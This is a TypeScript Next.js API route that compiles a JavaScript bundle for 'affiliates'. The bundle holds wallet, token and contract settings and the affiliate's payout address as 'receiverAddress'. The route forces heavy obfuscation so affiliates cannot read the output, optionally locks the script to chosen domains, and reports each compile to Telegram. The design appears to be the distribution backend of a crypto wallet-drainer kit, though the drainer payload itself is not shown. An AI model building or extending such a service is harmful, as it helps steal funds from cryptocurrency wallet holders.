/**
 * POST /api/affiliate/compile
 *
 * Public-facing compile endpoint for affiliates.
 * - Requires projectId in body
 * - Always compiles at "medium" obfuscation minimum (no "none" or "minify")
 * - Strips any sensitive internal config before generating the bundle
 * - Returns only the obfuscated script.js — never raw config
 */

import { NextResponse } from "next/server";
import {
  getAffiliateProject,
  getAffiliateConfig,
  updateAffiliateProject,
} from "@/lib/projects";
import {
  defaultGeneralConfig,
  defaultWalletConfig,
  defaultModalConfig,
  defaultTokensConfig,
  defaultAdvancedConfig,
} from "@/lib/mock-data";
import { generateSDKBundle } from "@/lib/sdk-generator";
import { readOperationalConfig } from "@/lib/operational-config-store";
import { obfuscateScript, obfuscateWithDomainLock, type ObfuscationLevel } from "@/lib/obfuscator";
import { sendTelegramNotification } from "@/lib/telegram";

const ALLOWED_LEVELS: ObfuscationLevel[] = ["medium", "heavy"];

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { projectId } = body;

    if (!projectId || typeof projectId !== "string") {
      return NextResponse.json(
        { status: "error", message: "Missing projectId" },
        { status: 400 }
      );
    }

    const project = await getAffiliateProject(projectId);
    if (!project) {
      return NextResponse.json(
        { status: "error", message: "Project not found" },
        { status: 404 }
      );
    }

    // Load saved config or defaults
    const config = await getAffiliateConfig(projectId);
    const operational = await readOperationalConfig();
    const general = config?.general ?? defaultGeneralConfig;
    const wallet = config?.wallet ?? defaultWalletConfig;
    const modal = config?.modal ?? { ...defaultModalConfig, exposeExternalSDK: true };
    const tokens = config?.tokens ?? defaultTokensConfig;
    const advanced = config?.advanced ?? defaultAdvancedConfig;

    // Generate the SDK bundle — only the payout address and affiliate label go in, never telegram/internal data
    let sdkBundle = generateSDKBundle({
      general,
      wallet,
      modal: { ...modal, exposeExternalSDK: true },
      tokens,
      advanced,
      contracts: operational.contracts,
      strategy: operational.strategy,
      appKit: operational.appKit,
      receiverAddress: project.payoutAddress,
      affiliateLabel: project.name,
    });

    // Force minimum "medium" obfuscation — affiliates cannot get raw/minified output
    const requestedLevel = (body.obfuscationLevel || "medium") as ObfuscationLevel;
    const level = ALLOWED_LEVELS.includes(requestedLevel) ? requestedLevel : "medium";

    if (project.domains && project.domains.length > 0) {
      sdkBundle = await obfuscateWithDomainLock(sdkBundle, project.domains, level);
    } else {
      sdkBundle = await obfuscateScript(sdkBundle, level);
    }

    // Mark as compiled
    await updateAffiliateProject(projectId, {
      lastCompiled: new Date().toISOString(),
    });

    void sendTelegramNotification({
      projectId,
      message:
        `🧩 Affiliate Compile\n` +
        `project: <code>${project.id}</code>\n` +
        `name: <b>${project.name}</b>\n` +
        `obfuscation: <b>${level}</b>\n` +
        `domainLock: <b>${project.domains?.length ? "enabled" : "disabled"}</b>`,
    });

    return new Response(sdkBundle, {
      headers: {
        "content-type": "application/javascript; charset=utf-8",
        "content-disposition": `attachment; filename="script-${projectId}.js"`,
        "cache-control": "no-store",
        "x-content-type-options": "nosniff",
      },
    });
  } catch {
    return NextResponse.json(
      { status: "error", message: "Compile failed" },
      { status: 500 }
    );
  }
}
